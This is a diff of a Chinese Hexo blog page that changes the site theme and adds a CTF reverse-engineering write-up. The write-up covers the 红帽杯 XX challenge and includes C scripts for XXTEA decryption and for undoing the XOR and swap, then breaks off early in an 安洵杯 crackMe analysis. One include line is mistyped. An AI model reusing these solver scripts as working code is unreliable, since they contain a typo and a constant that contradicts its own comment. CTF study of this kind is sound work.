@@ -1,447 +1,81 @@
-<!DOCTYPE HTML>
+<!DOCTYPE html>
 <html lang="zh-CN">
-
-
 <head>
-    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
-    <meta name="keywords" content="Hexo">
-    <meta name="description" content="Hexo">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <meta name="renderer" content="webkit|ie-stand|ie-comp">
-    <meta name="mobile-web-app-capable" content="yes">
-    <meta name="format-detection" content="telephone=no">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <meta name="referrer" content="no-referrer-when-downgrade">
-    <!-- Global site tag (gtag.js) - Google Analytics -->
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.0">
 
 
-    <title>Hexo</title>
-    <link rel="icon" type="image/png" href="/favicon.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
-    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
-    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
-    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
-    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
-    <link rel="stylesheet" type="text/css" href="/css/matery.css">
-    <link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" href="/css/main.css">
 
-    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
 
-<meta name="generator" content="Hexo 5.4.0">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" integrity="sha256-DfWjNxDkM94fVBWx1H5BMMp0Zq7luBlV8QRcSES7s+0=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"gift1a.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.11.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="https://gift1a.github.io/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="Gift1a">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://gift1a.github.io/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"index.html","title":""}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Hexo</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
 <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
 <link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
 
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="headband"></div>
 
-
-   <style>
-    body{
-       background-image: url(https://cdn.jsdelivr.net/gh/Tokisaki-Galaxy/res/site/medias/background.jpg);
-       background-repeat:no-repeat;
-       background-size: 100% 100%;
-       background-attachment:fixed;
-    }
-</style>
-
-
-
-<body>
-    <!-- hexo-inject:begin --><!-- hexo-inject:end --><header class="navbar-fixed">
-    <nav id="headNav" class="bg-color nav-transparent">
-        <div id="navContainer" class="nav-wrapper container">
-            <div class="brand-logo">
-                <a href="/" class="waves-effect waves-light">
-                    
-                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
-                    
-                    <span class="logo-span">Hexo</span>
-                </a>
-            </div>
-            
-
-<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
-<ul class="right nav-menu">
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/" class="waves-effect waves-light">
-      
-      <i class="fas fa-home" style="zoom: 0.6;"></i>
-      
-      <span>首页</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/tags" class="waves-effect waves-light">
-      
-      <i class="fas fa-tags" style="zoom: 0.6;"></i>
-      
-      <span>标签</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/categories" class="waves-effect waves-light">
-      
-      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
-      
-      <span>分类</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/archives" class="waves-effect waves-light">
-      
-      <i class="fas fa-archive" style="zoom: 0.6;"></i>
-      
-      <span>归档</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/about" class="waves-effect waves-light">
-      
-      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
-      
-      <span>关于</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/contact" class="waves-effect waves-light">
-      
-      <i class="fas fa-comments" style="zoom: 0.6;"></i>
-      
-      <span>留言板</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/friends" class="waves-effect waves-light">
-      
-      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
-      
-      <span>友情链接</span>
-    </a>
-    
-  </li>
-  
-  <li>
-    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
-      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
-    </a>
-  </li>
-</ul>
-
-
-<div id="mobile-nav" class="side-nav sidenav">
-
-    <div class="mobile-head bg-color">
-        
-        <img src="/medias/logo.png" class="logo-img circle responsive-img">
-        
-        <div class="logo-name">Hexo</div>
-        <div class="logo-desc">
-            
-            Never really desperate, only the lost of the soul.
-            
-        </div>
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
     </div>
+  </div>
 
-    <ul class="menu-list mobile-menu-list">
-        
-        <li class="m-nav-item">
-	  
-		<a href="/" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-home"></i>
-			
-			首页
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/tags" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-tags"></i>
-			
-			标签
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/categories" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-bookmark"></i>
-			
-			分类
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/archives" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-archive"></i>
-			
-			归档
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/about" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-user-circle"></i>
-			
-			关于
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/contact" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-comments"></i>
-			
-			留言板
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/friends" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-address-book"></i>
-			
-			友情链接
-		</a>
-          
-        </li>
-        
-        
-        <li><div class="divider"></div></li>
-        <li>
-            <a href="https://github.com/Gift1a" class="waves-effect waves-light" target="_blank">
-                <i class="fab fa-github-square fa-fw"></i>Fork Me
-            </a>
-        </li>
-        
-    </ul>
-</div>
+  <div class="site-meta">
 
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Hexo</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
 
-        </div>
-
-        
-            <style>
-    .nav-transparent .github-corner {
-        display: none !important;
-    }
-
-    .github-corner {
-        position: absolute;
-        z-index: 10;
-        top: 0;
-        right: 0;
-        border: 0;
-        transform: scale(1.1);
-    }
-
-    .github-corner svg {
-        color: #0f9d58;
-        fill: #fff;
-        height: 64px;
-        width: 64px;
-    }
-
-    .github-corner:hover .octo-arm {
-        animation: a 0.56s ease-in-out;
-    }
-
-    .github-corner .octo-arm {
-        animation: none;
-    }
-
-    @keyframes a {
-        0%,
-        to {
-            transform: rotate(0);
-        }
-        20%,
-        60% {
-            transform: rotate(-25deg);
-        }
-        40%,
-        80% {
-            transform: rotate(10deg);
-        }
-    }
-</style>
-
-<a href="https://github.com/Gift1a" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
-   data-tooltip="Fork Me" data-position="left" data-delay="50">
-    <svg viewBox="0 0 250 250" aria-hidden="true">
-        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
-        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
-              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
-        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
-              fill="currentColor" class="octo-body"></path>
-    </svg>
-</a>
-        
-    </nav>
-
-</header>
-
-    
-<style>
-    .carousel-control {
-        width: 45px;
-        height: 45px;
-        line-height: 55px;
-        border-radius: 45px;
-        background: transparent;
-        cursor: pointer;
-        z-index: 100;
-    }
-
-    #prev-cover {
-        position: absolute;
-        top: 48%;
-        left: 8px;
-    }
-
-    #next-cover {
-        position: absolute;
-        top: 48%;
-        right: 8px;;
-    }
-
-    #prev-cover i {
-        margin-right: 3px;
-    }
-
-    #next-cover i {
-        margin-left: 3px;
-    }
-
-    .carousel-control:hover {
-        background-color: rgba(0, 0, 0, .4);
-    }
-
-    .carousel-control i {
-        color: #fff;
-        font-size: 2.4rem;
-    }
-</style>
-
-
-
-<div class="carousel carousel-slider center index-cover" data-indicators="true" style="margin-top: -64px;">
-    
-
-    <div class="carousel-item  white-text bg-cover about-cover">
-        <div class="container">
-            <div class="row">
-    <div class="col s10 offset-s1 m8 offset-m2 l8 offset-l2">
-        <div class="brand">
-            <div class="title center-align">
-                
-                    subtitle
-                
-            </div>
-
-            <div class="description center-align">
-                
-                <span id="subtitle"></span>
-                <script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11"></script>
-                <script>
-                    var typed = new Typed("#subtitle", {
-                        strings: [ 
-                            
-                                "从0到0的CTF之路",
-                            
-                                "Never really desperate, only the lost of the soul",
-                            
-                        ],
-                        startDelay: 300,
-                        typeSpeed: 100,
-                        loop: true,
-                        backSpeed: 50,
-                        showCursor: true
-                    });
-                </script>
-                
-            </div>
-        </div>
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
     </div>
+  </div>
 </div>
-
-
-<script>
-    // 每天切换 banner 图.  Switch banner image every day.
-    var bannerUrl = "/medias/banner/" + new Date().getDay() + '.jpg';
-    $('.bg-cover').css('background-image', 'url(' + bannerUrl + ')');
-</script>
-
-
-
-            <div class="cover-btns">
-                <a href="#indexCard" class="waves-effect waves-light btn">
-                    <i class="fa fa-angle-double-down"></i>开始阅读
-                </a>
-
-                
-                    <a href="https://github.com/Gift1a/Gift1a.github.io" class="waves-effect waves-light btn" target="_blank">
-                        <i class="fab fa-github-alt"></i>Github
-                    </a>
-                
-            </div>
-            <div class="cover-social-link">
-    <a href="https://github.com/Gift1a/Gift1a.github.io" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
-        <i class="fab fa-github"></i>
-    </a>
-
-
-
-    <a href="mailto:2973414642@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
-        <i class="fas fa-envelope-open"></i>
-    </a>
-
-
-
-
-
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2973414642" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2973414642" data-position="top" data-delay="50">
-        <i class="fab fa-qq"></i>
-    </a>
 
 
 
@@ -450,1107 +84,2830 @@
 
 
 </div>
-        </div>
-    </div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
 
-    
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Gift1a</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">58</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
 </div>
 
-<script>
-    $(function () {
-        let coverSlider = $('.carousel');
-
-        //用户触摸轮播自动 restartPlay 是否生效
-        let initUserPressedOrDraggedActive = false
-
-        //用户触摸轮播自动 restartPlay
-        function initUserPressedOrDragged(instance) {
-            setInterval(() => {
-                if (instance.pressed || instance.dragged) {
-                    // console.log('initUserPressedOrDragged: ',instance.pressed,instance.dragged)
-                    restartPlay()
-                }
-            }, 1000)
-        }
-
-        coverSlider.carousel({
-            duration: Number('120'),
-            fullWidth: true,
-            indicators: 'true' === 'true',
-            onCycleTo() {
-                if (!initUserPressedOrDraggedActive) {
-                    // console.log('initUserPressedOrDraggedActive')
-                    initUserPressedOrDragged(this)
-                    initUserPressedOrDraggedActive = true
-                }
-            },
-        })
-
-        let carouselIntervalId;
-        
-        // Loop to call the next cover article picture.
-        let autoCarousel = function () {
-            carouselIntervalId = setInterval(function () {
-                coverSlider.carousel('next');
-            }, 5000);
-        };
-        autoCarousel();
-        
-
-        function restartPlay() {
-            
-            clearInterval(carouselIntervalId);
-            autoCarousel();
-            
-        };
-
-        
-        // prev and next cover post.
-        $('#prev-cover').click(function () {
-            coverSlider.carousel('prev');
-            restartPlay();
-        });
-        $('#next-cover').click(function () {
-            coverSlider.carousel('next');
-            restartPlay();
-        });
-        
-    });
-</script>
 
 
-
-<main class="content">
-
-    
-    <div id="indexCard" class="index-card">
-        <div class="container ">
-            <div class="card">
-                <div class="card-content">
-                    
-                        <div class="dream">
-    
-    <div class="title center-align">
-        <i class="far fa-lightbulb"></i>&nbsp;&nbsp;我的梦想
-    </div>
-    
-    <div class="row">
-        <div class="col l8 offset-l2 m10 offset-m1 s10 offset-s1 center-align text">
-            争取比赛不坐牢
         </div>
+      </div>
     </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://gift1a.github.io/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Gift1a">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Hexo">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">BUU刷题记录</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-04-18 14:51:41" itemprop="dateCreated datePublished" datetime="2022-04-18T14:51:41+08:00">2022-04-18</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-04-19 14:50:22" itemprop="dateModified" datetime="2022-04-19T14:50:22+08:00">2022-04-19</time>
+    </span>
+
+  
 </div>
 
-                    
-
-                    
-
-                    
-
-                    
-                    <div id="recommend-sections" class="recommend">
-                        
-
-
-
-
-
-<div class="title"><i class="far fa-thumbs-up"></i>&nbsp;&nbsp;推荐文章</div>
-
-<div class="row">
-
-    
-    
-    <div class="col s12 m6" >
-        
-            <div class="post-card" style="background-image: url('/medias/featureimages/19.jpg')">
-            
-            <div class="post-body">
-                <div class="post-categories">
-                    
-                        
-                    
-                </div>
-                <a href="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/">
-                    <h3 class="post-title">PE文件结构</h3>
-                </a>
-                <p class="post-description">
-                    
-                        PE学习之路0
-                    
-                </p>
-                <a href="/2022/03/03/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/" class="read-more btn waves-effect waves-light" style="background: linear-gradient(to right, #FF5E3A 0%, #FF2A68 100%)" target="_blank">
-                    <i class="icon far fa-eye fa-fw"></i>阅读更多
-                </a>
-            </div>
         </div>
-    </div>
+      </header>
+
     
     
-    <div class="col s12 m6" >
-        
-            <div class="post-card" style="background-image: url('/medias/featureimages/17.jpg')">
-            
-            <div class="post-body">
-                <div class="post-categories">
-                    
-                        
-                    
-                </div>
-                <a href="/2022/02/06/base64%E5%AE%9E%E7%8E%B0%E5%8F%8A%E7%BB%86%E8%8A%82%E5%89%96%E6%9E%90/">
-                    <h3 class="post-title">base64实现及细节剖析</h3>
-                </a>
-                <p class="post-description">
-                    
-                        源码#include&lt;stdio.h&gt;
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="红帽杯-XX"><a href="#红帽杯-XX" class="headerlink" title="红帽杯-XX"></a>红帽杯-XX</h1><h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><p>xxtea、异或、换位</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>整个过程就是取前四个输入作为密钥，先进行XXTEA加密，然后位置互换混淆，最后进行异或加密</p>
+<h3 id="取密钥"><a href="#取密钥" class="headerlink" title="取密钥"></a>取密钥</h3><p>这里判断取出前四位，判断是否为数组内的元素，因为如果不是的话，最后V11=V14退出程序</p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650329798015.png"></p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650329952441.png" alt="v6元素"></p>
+<p>取出地址中存储的字符，保证其不为0，下面那个循环是将取出的key末尾填充0</p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650330081892.png"></p>
+<p>我们的key是int型，这里传参时强制转为char型</p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650330189857.png"></p>
+<p>函数内部起始段是将我们传入的key转为int型，转换大小端序，因为原本是flag，转为int之后就变成了galf</p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650330259305.png"></p>
+<p>然后xxtea加密</p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650330294507.png"></p>
+<h3 id="打乱位置"><a href="#打乱位置" class="headerlink" title="打乱位置"></a>打乱位置</h3><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650330367612.png"></p>
+<h3 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h3><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650330508850.png" alt="index初始值"></p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650330454278.png"></p>
+<p>这段的逻辑就是只要是3的倍数就取出来异或，index从1开始，所以0、1、2下标的字符都不会被加密，3、4、5进行一次加密，异或的值为下标为0的enc_flag，6、7、8则两次，异或的值为下标为0、1的加密后的字符，依次往后，直到21、22、23，此时异或前六位加密字符</p>
+<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p>xxtea</p>
+<pre class="language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;string.&gt;
+
+
+#define xxtea_DELTA 0x9e3779b9
+#define xxtea_MX (((xxtea_z&gt;&gt;5^xxtea_y&lt;&lt;2) + (xxtea_y&gt;&gt;3^xxtea_z&lt;&lt;4)) ^ ((xxtea_sum^xxtea_y) + (xxtea_key[(xxtea_p&amp;3)^xxtea_e] ^ xxtea_z)))
+void xxtea(uint32_t* xxtea_origin, int xxtea_n, uint32_t const xxtea_key[4])
+{
+    uint32_t xxtea_y, xxtea_z, xxtea_sum;
+    unsigned xxtea_p, xxtea_rounds, xxtea_e;
+    if (xxtea_n &gt; 1)            /* Coding Part */
+    {
+        xxtea_rounds = 6 + 52 / xxtea_n;
+        xxtea_sum = 0;
+        xxtea_z = xxtea_origin[xxtea_n - 1];
+        do
+        {
+            xxtea_sum += xxtea_DELTA;
+            xxtea_e = (xxtea_sum &gt;&gt; 2) &amp; 3;
+            for (xxtea_p = 0; xxtea_p &lt; xxtea_n - 1; xxtea_p++)
+            {
+                xxtea_y = xxtea_origin[xxtea_p + 1];
+                xxtea_z = xxtea_origin[xxtea_p] += xxtea_MX;
+            }
+            xxtea_y = xxtea_origin[0];
+            xxtea_z = xxtea_origin[xxtea_n - 1] += xxtea_MX;
+        } while (--xxtea_rounds);
+    }
+    else if (xxtea_n &lt; -1)      /* Decoding Part */
+    {
+        xxtea_n = -xxtea_n;
+        xxtea_rounds = 6 + 52 / xxtea_n;
+        xxtea_sum = xxtea_rounds * xxtea_DELTA;
+        xxtea_y = xxtea_origin[0];
+        do
+        {
+            xxtea_e = (xxtea_sum &gt;&gt; 2) &amp; 3;
+            for (xxtea_p = xxtea_n - 1; xxtea_p &gt; 0; xxtea_p--)
+            {
+                xxtea_z = xxtea_origin[xxtea_p - 1];
+                xxtea_y = xxtea_origin[xxtea_p] -= xxtea_MX;
+            }
+            xxtea_z = xxtea_origin[xxtea_n - 1];
+            xxtea_y = xxtea_origin[0] -= xxtea_MX;
+            xxtea_sum -= xxtea_DELTA;
+        } while (--xxtea_rounds);
+    }
+}
+
+int main()
+{
+    //0x40CEA5BC,0xE7B2B2F4,0x129D12A9,0x5BC810AE,0x1D06D73D,0xDCF800DC
+	unsigned int enc[6] = { 0x40CEA5BC,0xE7B2B2F4,0x129D12A9,0x5BC810AE,0x1D06D73D,0xDCF870DC };
+	unsigned int key[4] = { (unsigned int)0x67616c66,(unsigned int)0x0,(unsigned int)0x0,(unsigned int)0x0 };
+    xxtea(enc, -6, key);
+    for (int i = 0; i &lt; 6; ++i)
+    {
+        printf("%c%c%c%c",((char*)&amp;enc[i])[0], ((char*)&amp;enc[i])[1], ((char*)&amp;enc[i])[2], ((char*)&amp;enc[i])[3]);
+    }//强制转为char然后依次取出，这样就不会逆序了
+	return 0;
+}</code></pre>
+
+<p>异或和位置互换</p>
+<pre class="language-c" data-language="c"><code class="language-c">#include&lt;stdio.h&gt;
+#include&lt;string.h&gt;
+
+int main()
+{
+	unsigned char data[24] = {
+	0xCE, 0xBC, 0x40, 0x6B, 0x7C, 0x3A, 0x95, 0xC0, 0xEF, 0x9B, 0x20, 0x20, 0x91, 0xF7, 0x02, 0x35,
+	0x23, 0x18, 0x02, 0xC8, 0xE7, 0x56, 0x56, 0xFA
+	};
+	int count = 0;
+	for (int i = 23; i &gt;= 0; --i)//因为最后的加密数据和前面的有关系，所以要从前往后
+	{
+		for (int j = 6 - count; j &gt;= 0; --j)//并且分为了多轮，除去前三个不需要异或，剩下7组，又是小于8，所以从下标为6开始
+		{
+			data[i] ^= data[j];
+		}
+		if (i % 3 == 0)
+		{
+			count++;
+		}
+	}
+	char encode_flag2[24] = { 0 };
+	//交换还原
+	encode_flag2[2]= *data;
+	*encode_flag2= data[1];
+	encode_flag2[3]= data[2];
+	encode_flag2[1]= data[3];
+	encode_flag2[6]= data[4];
+	encode_flag2[4]= data[5];
+	encode_flag2[7]= data[6];
+	encode_flag2[5]= data[7];
+	encode_flag2[10]= data[8];
+	encode_flag2[8]= data[9];
+	encode_flag2[11]= data[10];
+	encode_flag2[9]= data[11];
+	encode_flag2[14]= data[12];
+	encode_flag2[12]= data[13];
+	encode_flag2[15]= data[14];
+	encode_flag2[13]= data[15];
+	encode_flag2[18]= data[16];
+	encode_flag2[16]= data[17];
+	encode_flag2[19]= data[18];
+	encode_flag2[17]= data[19];
+	encode_flag2[22]= data[20];
+	encode_flag2[20]=data[21] ;
+	encode_flag2[23]= data[22];
+	for (int i = 0; i &lt; 24; ++i)
+	{
+		printf("0x%X,", encode_flag2[i]&amp;0xff);
+	}
+	return 0;
+}</code></pre>
+
+<h1 id="安洵杯-2019-crackMe"><a href="#安洵杯-2019-crackMe" class="headerlink" title="[安洵杯 2019]crackMe"></a>[安洵杯 2019]crackMe</h1><h2 id="考点-1"><a href="#考点-1" class="headerlink" title="考点"></a>考点</h2><p>SM4、Base64变表加密、换位</p>
+<h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>这里我和别人不一样，我运行不了程序，所以没办法动调，只能X查看交叉引用</p>
+<p>进去定位到主加密函数</p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333197817.png"></p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333231195.png"></p>
